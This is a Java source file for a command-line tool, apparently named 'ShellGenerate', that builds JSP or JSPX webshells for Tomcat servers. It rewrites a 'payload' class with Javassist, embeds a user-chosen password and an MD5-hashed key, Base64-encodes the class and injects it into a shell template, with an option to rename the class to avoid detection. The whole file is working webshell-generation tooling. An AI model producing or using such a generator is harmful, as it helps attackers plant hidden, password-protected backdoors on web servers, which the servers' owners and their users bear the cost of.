import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtField;
import javassist.Modifier;
import org.apache.commons.cli.*;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.text.ParseException;
import java.util.Base64;

public class Adm extends ClassLoader{
    public static void main(String[] args) throws Exception {
        try{
            CommandLine commandLine = cmd(args);
            String className = commandLine.getOptionValue("c");
            if(className == null){className = "payload";}
            String key = commandLine.getOptionValue("k");
            String pass = commandLine.getOptionValue("p");
            String v = commandLine.getOptionValue("v");
            String name = commandLine.getOptionValue("f");
            if (name==null){name = "shell.jsp";}
            if (v == null) {
                insertCode(key, pass, className);
            } else {
                insertCode10(key, pass, className);
            }
            String code = generateCode(className);
            generateShell(name, className, code);
        }catch (NullPointerException e){
            System.exit(0);
        }

    }
    private static CommandLine cmd(String[] args) throws ParseException{
        Options options = new Options();
        Option opt = new Option("h","help",false,"显示使用帮助");
        opt.setRequired(false);
        options.addOption(opt);

        opt = new Option("k","key",true,"指定shell的key");
        opt.setRequired(true);
        options.addOption(opt);

        opt = new Option("p","pass",true,"指定shell的pass");
        opt.setRequired(true);
        options.addOption(opt);


        opt = new Option("f","file",true,"指定生成的脚本名称，默认为shell.jsp");
        opt.setRequired(false);
        options.addOption(opt);

        opt = new Option("c","class",true,"指定落地的类名称，默认为payload.class，建议修改为其他名称");
        opt.setRequired(false);
        options.addOption(opt);

        opt = new Option("v","version",true,"指定生成shell的版本，默认为tomcat10以下，设为1则适配tomcat10");
        opt.setRequired(false);
        options.addOption(opt);
        HelpFormatter hf = new HelpFormatter();
        hf.setWidth(110);
        CommandLine commandLine = null;
        CommandLineParser parser = new DefaultParser();
        try {
            commandLine = parser.parse(options,args);
            if (commandLine.hasOption('h')){
                hf.printHelp("ShellGenerate",options,true);
            }
        } catch (org.apache.commons.cli.ParseException e) {
            hf.printHelp("ShellGenerate",options,true);
        }
        return commandLine;
    }
    public static String byteArrayToHexPrefix(byte[] bytes, String prefix) {
        String strHex = "";
        StringBuilder sb = new StringBuilder();
        for (int n = 0; n < bytes.length; n++) {
            strHex = Integer.toHexString(bytes[n] & 0xFF);
            sb.append(prefix);
            sb.append((strHex.length() == 1) ? ("0" + strHex) : strHex);
        }
        return sb.toString().trim();
    }
    public static String byteArrayToHex(byte[] bytes) {
        return byteArrayToHexPrefix(bytes, "");
    }
    public static String md5(String s) {
        return byteArrayToHex(md5(s.getBytes())).substring(0,16);
    }
    public static byte[] md5(byte[] data) {
        byte[] ret = null;
        try {
            MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(data, 0, data.length);
            ret = m.digest();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        return ret;
    }
    public static void insertCode(String xc,String pass,String className){
        try {
            ClassPool cp = ClassPool.getDefault();
            CtClass cc;
            cc = cp.get("payload");
            cc.defrost();
            for (CtField field : cc.getDeclaredFields()) {
                if (field.getName().equals("xc") || field.getName().equals("pass")) {
                    cc.removeField(field);
                }
            }
            CtField ctField = new CtField(cp.get("java.lang.String"), "pass", cc);
            ctField.setModifiers(Modifier.PUBLIC);
            cc.addField(ctField, CtField.Initializer.constant(pass));
            CtField ctField2 = new CtField(cp.get("java.lang.String"), "xc", cc);
            ctField2.setModifiers(Modifier.PUBLIC);
            cc.addField(ctField2, CtField.Initializer.constant(md5(xc)));
            cc.setName(className);
            cc.writeFile(String.valueOf(Paths.get(System.getProperty("user.dir"), "templates")));
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static void insertCode10(String xc,String pass,String className){
        try {
            ClassPool cp = ClassPool.getDefault();
            CtClass cc;
            cc = cp.get("payload10");
            cc.defrost();
            for (CtField field : cc.getDeclaredFields()) {
                if (field.getName().equals("xc") || field.getName().equals("pass")) {
                    cc.removeField(field);
                }
            }
            CtField ctField = new CtField(cp.get("java.lang.String"), "pass", cc);
            ctField.setModifiers(Modifier.PUBLIC);
            cc.addField(ctField, CtField.Initializer.constant(pass));
            CtField ctField2 = new CtField(cp.get("java.lang.String"), "xc", cc);
            ctField2.setModifiers(Modifier.PUBLIC);
            cc.addField(ctField2, CtField.Initializer.constant(md5(xc)));
            cc.setName(className);
            cc.writeFile(String.valueOf(Paths.get(System.getProperty("user.dir"), "templates")));
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static String generateCode(String className) throws IOException {
        Path path = Paths.get(System.getProperty("user.dir"),"templates",className + ".class");
        byte[] bytes = Files.readAllBytes(path);
        String code = Base64.getEncoder().encodeToString(bytes);
        Files.delete(path);
        return code;
    }
    public static void generateShell(String name,String className,String code) throws IOException {
        Path path = null;
        if (name.indexOf("jspx")!=-1){
            path = Paths.get(System.getProperty("user.dir"),"templates","shell.jspx");
        }
        if ((name.indexOf("jsp")!=-1) && (name.lastIndexOf("jspx")==-1)){
            path = Paths.get(System.getProperty("user.dir"),"templates","shell.jsp");
        }else {
            path = Paths.get(System.getProperty("user.dir"),"templates","shell.jsp");
        }
        File file = new File(path.toUri());
        FileReader in = new FileReader(file);
        BufferedReader bufIn = new BufferedReader(in);
        CharArrayWriter  tempStream = new CharArrayWriter();
        String line = null;
        while ( (line = bufIn.readLine()) != null) {
            // 替换每行中, 符合条件的字符串
            line = line.replaceAll("shellCode", code);
            line = line.replaceAll("shellName",className);
            // 将该行写入内存
            tempStream.write(line);
            // 添加换行符
            tempStream.append(System.getProperty("line.separator"));
        }
        bufIn.close();
        path = Paths.get(System.getProperty("user.dir"),name);
        file = new File(path.toUri());
        FileWriter out = new FileWriter(file);
        tempStream.writeTo(out);
        out.close();
        System.out.println(name+"已生成，路径为：" + path);
    }
}
